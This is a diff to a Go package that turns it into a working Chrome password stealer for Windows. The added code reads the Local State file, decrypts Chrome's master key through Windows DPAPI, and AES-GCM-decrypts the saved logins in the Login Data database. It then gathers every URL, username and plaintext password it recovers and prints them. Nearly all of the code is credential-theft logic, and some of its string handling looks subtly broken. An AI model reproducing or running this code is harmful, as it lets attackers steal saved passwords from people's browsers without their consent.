@@ -1,13 +1,19 @@
-
 package chrome
 
 import (
 	"database/sql"
+	"fmt"
 	"io"
 	"log"
 	"os"
 	"syscall"
 	"unsafe"
+	"strings"
+	"encoding/json"
+	"io/ioutil"
+	"encoding/base64"
+	"crypto/aes"
+	"crypto/cipher"
 	_ "github.com/mattn/go-sqlite3"
 )
 
@@ -19,8 +25,10 @@ var (
 	procLocalFree   = dllkernel32.NewProc("LocalFree")
 
 	dataPath string = os.Getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
+	localStatePath string = os.Getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
+	masterKey []byte 
+	credentials []credential
 )
-	var credentials []credential
 
 type credential struct{
 	Url string
@@ -107,25 +115,57 @@ func checkFileExist(filePath string) bool {
 	}
 }
 
-func GetPasswords() ([]credential){
+
+func getMasterKey() ([]byte,error){
+
+	var masterKey []byte
+
+	// Get the master key
+	// The master key is the key with which chrome encode the passwords but it has some suffixes and we need to work on it
+	jsonFile, err := os.Open(localStatePath) // The rough key is stored in the Local State File which is a json file
+	if err != nil {
+	    return masterKey,err
+	}
+
+	defer jsonFile.Close()
+
+	byteValue, err := ioutil.ReadAll(jsonFile)
+	if err != nil {
+	    return masterKey,err
+	}
+	var result map[string]interface{}
+	json.Unmarshal([]byte(byteValue), &result)
+	roughKey := result["os_crypt"].(map[string]interface{})["encrypted_key"].(string) // Found parsing the json in it
+	decodedKey, err := base64.StdEncoding.DecodeString(roughKey)// It's stored in Base64 so.. Let's decode it
+	stringKey := string(decodedKey) 
+	stringKey = strings.Trim(stringKey, "DPAPI") // The key is encrypted using the windows DPAPI method and signed with it. the key looks like "DPAPI05546sdf879z456..." Let's Remove DPAPI.
+	
+	masterKey,err = Decrypt([]byte(stringKey)) // Decrypt the key using the dllcrypt32 dll.
+	if err != nil{
+		return masterKey,err
+	}
+
+	return masterKey,nil
+
+}
+
+func GetPasswords() ([]credential) {
 	//Check for Login Data file
 	if !checkFileExist(dataPath) {
 		os.Exit(0)
 	}
 
+	
 	//Copy Login Data file to temp location
 	err := copyFileToDirectory(dataPath, os.Getenv("APPDATA")+"\\tempfile.dat")
 	if err != nil {
-		fmt.Println("1")
-
 		log.Fatal(err)
 	}
+
 
 	//Open Database
 	db, err := sql.Open("sqlite3", os.Getenv("APPDATA")+"\\tempfile.dat")
 	if err != nil {
-		fmt.Println("2")
-
 		log.Fatal(err)
 	}
 	defer db.Close()
@@ -133,7 +173,6 @@ func GetPasswords() ([]credential){
 	//Select Rows to get data from
 	rows, err := db.Query("select origin_url, username_value, password_value from logins")
 	if err != nil {
-		fmt.Println("3")
 		log.Fatal(err)
 	}
 	defer rows.Close()
@@ -145,37 +184,79 @@ func GetPasswords() ([]credential){
 
 		err = rows.Scan(&URL, &USERNAME, &PASSWORD)
 		if err != nil {
-			fmt.Println("4")
 			log.Fatal(err)
 		}
 		//Decrypt Passwords
-		pass, err := Decrypt([]byte(PASSWORD))
-		if err != nil {
-			fmt.Println("5")
-			log.Fatal(err)
+		if strings.HasPrefix(PASSWORD, "v10"){ // Means it's chrome 80 or higher
+			PASSWORD = strings.Trim(PASSWORD, "v10") 
+
+			//fmt.Println("Chrome Version is 80 or higher, switching to the AES 256 decrypt.")
+			if string(masterKey) != ""{
+				ciphertext := []byte(PASSWORD)
+				c, err := aes.NewCipher(masterKey)
+			    if err != nil {
+			    	
+			        fmt.Println(err)
+			    }
+			    gcm, err := cipher.NewGCM(c)
+			    if err != nil {
+			        fmt.Println(err)
+			    }
+			    nonceSize := gcm.NonceSize()
+			    if len(ciphertext) < nonceSize {
+			        fmt.Println(err)
+			    }
+
+			    nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
+			    plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
+			    if err != nil {
+			        fmt.Println(err)
+			    }
+			    if string(plaintext) != ""{
+			    	if URL != "" && USERNAME != "" && string(plaintext) != "" {
+						cred := new(credential)
+						cred.Url = URL
+						cred.Login = USERNAME
+						cred.Password = string(string(plaintext))
+						credentials = append(credentials, *cred)
+					}
+			    	fmt.Println(URL," | ", USERNAME," | ", string(plaintext))
+			    	fmt.Println(URL," | ", USERNAME," | ", "**DEMO**")
+
+			    }
+			}else{ // It the masterkey hasn't been requested yet, then gets it.
+				mkey,err := getMasterKey()
+				if err != nil{
+					fmt.Println(err)
+				}
+				masterKey = mkey
+			}
+		}else{ //Means it's chrome v. < 80
+			pass, err := Decrypt([]byte(PASSWORD))
+			if err != nil {
+				log.Fatal(err)
+			}
+
+			if URL != "" && URL != "" && string(pass) != "" {
+				cred := new(credential)
+				cred.Url = URL
+				cred.Login = USERNAME
+				cred.Password = string(pass)
+				credentials = append(credentials, *cred)
+
+			}
 		}
+
+		
 		//Check if no value, if none skip
-		if URL != "" && USERNAME != "" && string(pass) != "" {
-			cred := new(credential)
-			cred.Url = URL
-			cred.Login = USERNAME
-			cred.Password = string(pass)
-			credentials = append(credentials, *cred)
-
-			//byte, _:= json.Marshal(cred)
-
-			//fmt.Println(URL, USERNAME, string(pass))
-		}
+		
 	}
-	//fmt.Printf("%v", credentials)
-
 	err = rows.Err()
 	if err != nil {
-		fmt.Println("6")
 		log.Fatal(err)
 	}
-	//fmt.Printf("%v",credentials)
-
 	return credentials
 
+
 }
+
